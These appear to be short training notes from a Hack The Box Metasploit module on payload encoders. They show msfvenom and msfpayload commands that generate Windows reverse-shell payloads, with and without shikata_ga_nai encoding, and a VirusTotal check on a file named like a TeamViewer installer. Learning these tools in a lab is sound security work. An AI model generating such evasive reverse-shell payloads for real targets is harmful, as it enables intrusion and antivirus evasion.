## Selecting an Encoder

```shell
3kjS@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```
#### Generating Payload - Without Encoding

```shell
3kjS@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```
#### Generating Payload - With Encoding

```shell
3kjS@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```
#### Shikata Ga Nai Encoding
![[Pasted image 20260504123736.png]]
Source: [https://hatching.io/blog/metasploit-payloads2/](https://hatching.io/blog/metasploit-payloads2/)
#### MSF - VirusTotal

```shell
3kjS@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

